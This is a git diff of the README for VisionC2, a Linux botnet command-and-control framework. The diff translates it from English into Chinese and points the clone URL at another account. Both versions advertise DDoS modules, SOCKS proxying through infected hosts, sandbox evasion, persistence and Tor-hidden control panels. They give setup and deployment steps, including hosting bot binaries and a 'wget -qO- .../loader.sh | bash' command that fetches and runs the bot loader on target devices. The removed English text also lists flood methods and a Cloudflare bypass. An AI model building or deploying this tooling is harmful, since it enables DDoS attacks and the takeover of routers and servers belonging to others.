@@ -1,223 +1,138 @@
-
 <div align="center">
 
 # VisionC2
 
-### Advanced Linux C2 Framework — Modular, Encrypted, Cross-Architecture
+### 高级 Linux C2 框架 - 模块化、加密、跨架构
 
 <br>
 
 | | |
 |:-:|:-:|
-| 🧩 **Modular Bot Builds**<br>Pick your payload: full DDoS arsenal, SOCKS5 proxy mesh, lightweight remote shell, or all of the above. Select modules at compile time| 🔒 **Fully Static Binaries**<br>Every binary runs on any Linux kernel: ancient routers, uClibc embedded devices, minimal containers. All 14 architectures produce a `statically linked` ELF. |
-| 🛡️ **Encrypted Everything**<br>TLS 1.3 on port 443. AES-256-CTR config encryption with unique per-build keys. C2 address buried under 6 layers — Base64, XOR, RC4, byte substitution, MD5 checksum, AES-CTR. HMAC challenge-response auth on every connection. Zero plaintext in the binary. | 🖥️ **3 Control Interfaces**<br>Tor hidden service web panel (zero clearnet exposure). Interactive Go TUI. Telnet CLI for remote/multi-user access. RBAC across all three with 4 permission tiers. Single `users.json` shared between all interfaces. |
+| **模块化 Bot 构建**<br>可在编译时选择载荷能力：完整攻击模块、SOCKS5 代理网格、轻量远程 Shell，或组合启用。| **全静态二进制**<br>所有 Bot 二进制均面向 Linux 静态链接，覆盖旧路由器、uClibc 嵌入式设备、最小化容器等环境，支持 14 种架构。 |
+| **全链路加密**<br>Bot 与 CNC 使用 443 端口 TLS。配置使用 AES-256-CTR 加密，每次构建生成唯一密钥；C2 地址经过 Base64、XOR、RC4、字节替换、MD5 校验、AES-CTR 等多层处理；连接使用 HMAC 挑战响应认证。 | **3 种控制界面**<br>Tor 隐藏服务 Web 面板、本地 Go TUI、远程 Telnet CLI。三种入口共用 `users.json`，支持多级权限控制。 |
 
 <br>
 
 [![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
 [![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)]()
-[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](#deploying-bots)
+[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](#bot-部署)
 [![Changelog](https://img.shields.io/badge/Changelog-Docs-f59e0b?style=for-the-badge)](Docs/CHANGELOG.md)
-
-<br>
-
-<details>
-<summary><b>📸 Web Panel (Tor Hidden Service)</b></summary>
-<br>
-<img src="https://github.com/user-attachments/assets/e6bbfd83-725f-4881-8b9d-c6be45b88f27" alt="VisionC2 Tor Panel" width="100%">
-</details>
-
-<details>
-<summary><b>📸 Remote Shell & File Browser</b></summary>
-<br>
-<img width="1378" height="857" alt="image" src="https://github.com/user-attachments/assets/1885ebfe-ff79-4b05-a084-28e565454824">
-</details>
-
-<details>
-<summary><b>📸 Attack Builder Interface</b></summary>
-<br>
-<img width="2353" height="866" alt="image" src="https://github.com/user-attachments/assets/ea1c9717-98a1-4400-9895-cb480f4feb06">
-</details>
-
-<details>
-<summary><b>📸 User Management Panel</b></summary>
-<br>
-<img width="2375" height="1017" alt="image" src="https://github.com/user-attachments/assets/21b33bf9-ccbf-4197-933e-fc28b85923fe">
-</details>
-
-<details>
-<summary><b>📸 Scheduled Tasks View</b></summary>
-<br>
-<img width="2365" height="535" alt="image" src="https://github.com/user-attachments/assets/e3051202-253b-46e8-9deb-680580c24602">
-</details>
 
 </div>
 
 ---
 
-## 📋 Table of Contents
+## 目录
 
-- [Quick Start](#quick-start)
-- [Architecture Overview](#architecture-overview)
-- [Attack Methods](#attack-methods)
-- [Bot Deployment](#bot-deployment)
-- [Control Interfaces](#control-interfaces)
-- [Documentation](#documentation)
-- [Legal Disclaimer](#legal-disclaimer)
+- [快速开始](#快速开始)
+- [架构概览](#架构概览)
+- [Bot 部署](#bot-部署)
+- [控制界面](#控制界面)
+- [文档](#文档)
+- [法律声明](#法律声明)
 
 ---
 
-##  Quick Start
+## 快速开始
 
-### System Requirements
+### 系统要求
 
-| Requirement | Minimum | Recommended |
-|-------------|---------|-------------|
-| **RAM** | 512MB | 2GB+ |
-| **Storage** | 1GB | 10GB+ |
-| **Network** | Port 443 inbound | Static public IP |
-| **OS** | Ubuntu 20.04+ | Ubuntu 22.04+ |
+| 项目 | 最低要求 | 推荐配置 |
+|------|----------|----------|
+| **内存** | 512MB | 2GB+ |
+| **存储** | 1GB | 10GB+ |
+| **网络** | 允许 443 入站 | 静态公网 IP |
+| **系统** | Ubuntu 20.04+ | Ubuntu 22.04+ |
 
-### Install Dependencies
+### 安装依赖
 
 ```bash
 sudo apt update && sudo apt install -y openssl git wget python3 screen tor upx-ucl
 
-# Install Go 1.24+
+# 安装 Go 1.24+
 wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
 sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
 export PATH=$PATH:/usr/local/go/bin
 echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
 ```
 
-### One-Command Setup
+### 一键初始化
 
 ```bash
-git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
+git clone https://github.com/xing-kalip/VisionC2.git && cd VisionC2
 python3 setup.py
 ```
 
-Select **[1] Full Setup** and follow the interactive wizard. You'll be prompted for:
+选择 **[1] 完整初始化**，按交互向导填写：
 
-- C2 server address (IP or domain)
-- Admin interface port
-- TLS certificate details
-- Bot module selection (attacks/SOCKS/both)
+- C2 服务器地址（IP 或域名）
+- 管理界面端口
+- TLS 证书信息
+- Bot 模块选择（攻击 / SOCKS / 两者 / 仅管理）
 
-### Build Outputs
+### 构建产物
 
-After setup completes, you'll find:
+初始化完成后会生成：
 
-```
+```text
 VisionC2/
-├── bins/              # 14 bot binaries (one per architecture)
-├── server             # CNC control binary
-├── relay_server       # SOCKS relay binary
-├── cnc/certificates/  # TLS key pair
-└── setup_config.txt   # Full configuration backup
+├── bins/              # 14 个 Bot 二进制，每个架构一个
+├── server             # CNC 控制端二进制
+├── relay_server       # SOCKS 中继服务端二进制
+├── cnc/certificates/  # TLS 密钥对
+└── setup_config.txt   # 完整配置备份
 ```
 
-### Start the CNC Server
+### 启动 CNC 服务端
 
 ```bash
-./server              # Interactive launcher (choose mode at startup)
-./server --tui        # Direct TUI mode
-./server --split      # Telnet CLI on admin port
-./server --daemon     # Headless mode (no local UI)
+./server              # 交互式启动器，启动时选择模式
+./server --tui        # 直接进入 TUI 模式
+./server --split      # 管理端口上的 Telnet CLI
+./server --daemon     # 无本地 UI 的后台模式
 ```
 
-**Run persistently:** `screen -S vision ./server` — detach with `Ctrl+A D`
+持久运行示例：`screen -S vision ./server`，使用 `Ctrl+A D` 分离会话。
 
 ---
 
-##  Setup Configuration Options
+## 初始化选项
 
-| Option | Description |
-|--------|-------------|
-| **[1] Full Setup** | New C2 address, AES key, tokens, certificates, and bot builds |
-| **[2] C2 URL Update** | Change C2 address only — preserves magic code, certs, tokens |
-| **[3] Module Update & Rebuild** | Change bot module selection — preserves everything else |
-| **[4] Restore from setup_config.txt** | Restore saved config after `git pull` or fresh clone |
-
----
-
-##  Architecture Overview
-
-```
-┌─────────────┐       TLS 1.3 / 443        ┌─────────────┐
-│  Operator    │◄── Tor Hidden Service ────►│  CNC Server │
-│ (Browser /   │                            │   cnc/      │
-│  TUI / Tel)  │                            └──────┬──────┘
-└─────────────┘                                    │
-                                         TLS 1.3 / 443
-                                                   │
-                         ┌─────────────────────────┼─────────────────────────┐
-                         │                         │                         │
-                   ┌─────┴─────┐             ┌─────┴─────┐             ┌─────┴─────┐
-                   │    Bot    │             │    Bot    │             │    Bot    │
-                   │  (arm64)  │             │  (x86_64) │             │  (mips)   │
-                   └───────────┘             └───────────┘             └───────────┘
-```
-
-### Component Breakdown
-
-| Component | Path | Role |
-|-----------|------|------|
-| **CNC Server** | `cnc/` | Central C2 — TLS 443 for bots, embedded Tor hidden service, TUI + Telnet CLI, RBAC |
-| **Bot Agent** | `bot/` | Deployed agent — TLS 1.3, 6-layer C2 decoding, sandbox evasion, persistence, optional attacks/SOCKS |
-| **SOCKS Relay** | `cnc/relay/` | SOCKS5 relay — bots backconnect, users connect via SOCKS5 port, disposable VPS infrastructure |
-| **Tooling** | `tools/` | Build script (`build.sh`), crypto helper, deployment loader |
+| 选项 | 说明 |
+|------|------|
+| **[1] 完整初始化** | 生成新的 C2 地址、AES 密钥、令牌、证书并构建 Bot |
+| **[2] 仅更新 C2 URL** | 只修改 C2 地址，保留 magic code、证书和令牌 |
+| **[3] 更新模块并重建** | 修改 Bot 模块选择，其他配置保持不变 |
+| **[4] 从 setup_config.txt 恢复** | `git pull` 或重新克隆后恢复保存的配置 |
 
 ---
 
-##  Attack Methods
+## 架构概览
 
-### Layer 4 (Network Layer)
+```text
+Operator / Browser / TUI / Telnet
+            |
+            | Tor Hidden Service / TLS
+            v
+        CNC Server
+            |
+            | TLS 1.3 / 443
+            v
+    Bot Agents across architectures
+```
 
-| Method | Description |
-|--------|-------------|
-| **UDP Flood** | High-volume 1024-byte UDP payloads |
-| **TCP Flood** | Connection table exhaustion |
-| **SYN Flood** | Randomized source ports via raw TCP |
-| **ACK Flood** | ACK packet spam via raw TCP |
-| **GRE Flood** | Protocol 47, maximum payload |
-| **DNS Flood** | Randomized query types against resolver pool |
-
-### Layer 7 (Application Layer)
-
-| Method | Description |
-|--------|-------------|
-| **HTTP Flood** | GET/POST with randomized headers and user-agents |
-| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
-| **CF Bypass** | Cloudflare bypass via session/cookie reuse and fingerprinting |
-| **Rapid Reset** | HTTP/2 CVE-2023-44487 — HEADERS + RST_STREAM at scale |
-
-> **Note:** All L7 methods support HTTP and SOCKS5 proxy rotation via `-p <proxy_list_url>`.
+| 组件 | 路径 | 作用 |
+|------|------|------|
+| **CNC 服务端** | `cnc/` | Bot TLS 接入、Tor Web 面板、TUI、Telnet CLI、权限控制 |
+| **Bot Agent** | `bot/` | 远程代理，包含 TLS、C2 解码、持久化、可选攻击/SOCKS 模块 |
+| **SOCKS 中继** | `cnc/relay/` | Bot 反连中继，用户通过 SOCKS5 端口接入 |
+| **工具脚本** | `tools/` | 构建、加密辅助、部署 loader |
 
 ---
 
-##  SOCKS5 Proxy System
+## Bot 部署
 
-Bots backconnect to a relay server — they **never open inbound ports**. The relay accepts SOCKS5 clients on its public port and tunnels traffic through the bot to the target.
-
-```
-Client → [SOCKS5] → Relay ←── [backconnect TLS] ──← Bot → Target
-```
-  > Direct SOCKS5 on bot also available incase no relay server
-
-### Key Features
-
-- **Zero inbound ports** on bots — bypasses firewalls
-- **Dynamic relay management** — add/remove relays from CNC dashboard without rebuilds
-- **Disposable infrastructure** — rotate relay servers seamlessly
-
----
-
-##  Bot Deployment
-
-### 1. Host Binaries
-
-Host compiled binaries on a separate VPS:
+### 1. 托管二进制
 
 ```bash
 sudo apt install -y apache2
@@ -225,136 +140,65 @@ sudo cp bins/* /var/www/html/bins/
 sudo systemctl start apache2
 ```
 
-### 2. Configure Loader
+### 2. 配置 Loader
 
-Edit `tools/loader.sh` line 3 with your hosting server IP:
+编辑 `tools/loader.sh` 第 3 行：
 
 ```bash
 SRV="http://<your-server-ip>/bins"
 ```
 
-### 3. Deploy
-
-The loader auto-detects target architecture and fetches the matching binary from the 14 available variants:
+### 3. 执行部署
 
 ```bash
 wget -qO- http://your-server/loader.sh | bash
 ```
 
-### Supported Architectures
-
-| Architecture | Status | Use Case |
-|--------------|--------|----------|
-| x86, x86_64 | ✅ Full | Standard servers, desktops |
-| ARM v5/v6/v7 | ✅ Full | Older embedded, routers |
-| ARM64 | ✅ Full | Modern ARM servers, SBCs |
-| MIPS, MIPS64 | ✅ Full | Routers, networking gear |
-| PPC64 | ✅ Full | IBM Power systems |
-| s390x | ✅ Full | IBM Z mainframes |
-| RISC-V | ✅ Full | Emerging architecture |
+支持架构：x86、x86_64、ARM v5/v6/v7、ARM64、MIPS、MIPS64、PPC64、s390x、RISC-V。
 
 ---
 
-##  Control Interfaces
+## 控制界面
 
-<img src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" alt="VisionC2 TUI" width="100%">
+| 界面 | 访问方式 | 适用场景 |
+|------|----------|----------|
+| **Tor Web 面板** | Tor Browser 访问 `.onion` | 完整图形界面、Bot 管理、Shell、SOCKS、用户管理 |
+| **Go TUI** | `./server --tui` | 本地终端交互、实时 Bot 视图 |
+| **Telnet CLI** | `./server --split` | 轻量远程访问、多用户、脚本化操作 |
 
-| Interface | Access Method | Best For |
-|-----------|---------------|----------|
-| **Tor Web Panel** | `.onion` via Tor Browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log, user admin |
-| **Go TUI** | `./server --tui` | Local interactive terminal with live bot feed and attack launcher |
-| **Telnet CLI** | `./server --split` | Lightweight remote access, multi-user, scriptable operations |
+### 权限控制
 
-### Role-Based Access Control (RBAC)
-
-All three interfaces share `users.json` with four permission tiers:
-
-| Role | Permissions |
-|------|-------------|
-| **Admin** | Full system control, user management |
-| **Operator** | Attack execution, bot management |
-| **Viewer** | Read-only monitoring |
-| **Relay Only** | SOCKS relay operations only |
+| 角色 | 权限 |
+|------|------|
+| **Owner/Admin** | 完整系统控制、用户管理 |
+| **Pro** | 攻击执行和目标选择 |
+| **Basic** | 基础监控和受限操作 |
 
 ---
 
-##  Documentation
+## 文档
 
-| Document | Description |
-|----------|-------------|
-| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | System design, encryption layers, protocol details |
-| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Full version history and updates |
-| [`COMMANDS.md`](Docs/COMMANDS.md) | Complete TUI command and hotkey reference |
-| [`SETUP.md`](Docs/SETUP.md) | Detailed installation and configuration guide |
-| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment and configuration |
-
----
-
-## 🔧 Troubleshooting
-
-<details>
-<summary><b>"go: command not found" or wrong Go version</b></summary>
-
-```bash
-export PATH=$PATH:/usr/local/go/bin
-go version  # should show 1.24+
-```
-</details>
-
-<details>
-<summary><b>"Permission denied" when starting server on port 443</b></summary>
-
-```bash
-sudo setcap 'cap_net_bind_service=+ep' ./server
-```
-</details>
-
-<details>
-<summary><b>Bots won't connect to CNC</b></summary>
-
-- Confirm port 443 is open: `sudo ufw allow 443/tcp`
-- Verify C2 address in `setup_config.txt` matches your server's public IP
-- Test TLS connectivity: `openssl s_client -connect YOUR_IP:443`
-- Enable verbose logging: rerun `setup.py` with debug mode ON
-</details>
-
-<details>
-<summary><b>Relay server won't start</b></summary>
-
-- Check port availability: `ss -tulpn | grep :1080`
-- Ensure binary is executable: `chmod +x relay_server`
-- Verify auth key matches CNC magic code in `setup_config.txt`
-</details>
-
-<details>
-<summary><b>Web panel not accessible via Tor</b></summary>
-
-- Verify Tor is running: `systemctl status tor`
-- Check hidden service hostname: `sudo cat /var/lib/tor/hidden_service/hostname`
-- Ensure `torrc` contains: `HiddenServicePort 80 127.0.0.1:8080`
-</details>
+| 文档 | 说明 |
+|------|------|
+| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | 系统设计、加密层、协议流程 |
+| [`CHANGELOG.md`](Docs/CHANGELOG.md) | 版本历史 |
+| [`COMMANDS.md`](Docs/COMMANDS.md) | TUI / Web / CLI 快捷键和命令参考 |
+| [`SETUP.md`](Docs/SETUP.md) | 安装和配置指南 |
+| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 中继部署指南 |
 
 ---
 
-##  Legal Disclaimer
+## 排障
 
-**For authorized security research and educational purposes only.**
-
-Usage against systems without explicit prior consent is **illegal**. The developer assumes **no liability** for misuse, unauthorized access, or any damages caused by this software.
-
-**By using this software, you agree that you:**
-- Have obtained proper authorization for all testing
-- Will comply with all applicable laws and regulations
-- Accept full responsibility for your actions
+- Go 未找到：确认 `/usr/local/go/bin` 已加入 `PATH`
+- 443 端口权限不足：`sudo setcap 'cap_net_bind_service=+ep' ./server`
+- Bot 无法连接：检查防火墙、C2 地址、TLS 连通性和 `setup_config.txt`
+- Tor 面板无法访问：检查 `tor` 服务和 hidden service 配置
 
 ---
 
-<div align="center">
+## 法律声明
 
-**Developed by Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)
+**仅限已授权的安全研究、渗透测试和教学环境。**
 
----
-
-⭐ **Star this repository** if you find it useful for research purposes
-
-</div>
+未经明确授权对第三方系统使用本工具是违法行为。使用者需自行确保所有测试均已获得书面授权，并遵守所在地法律法规。开发者不对滥用、未授权访问或由此造成的任何损害承担责任。
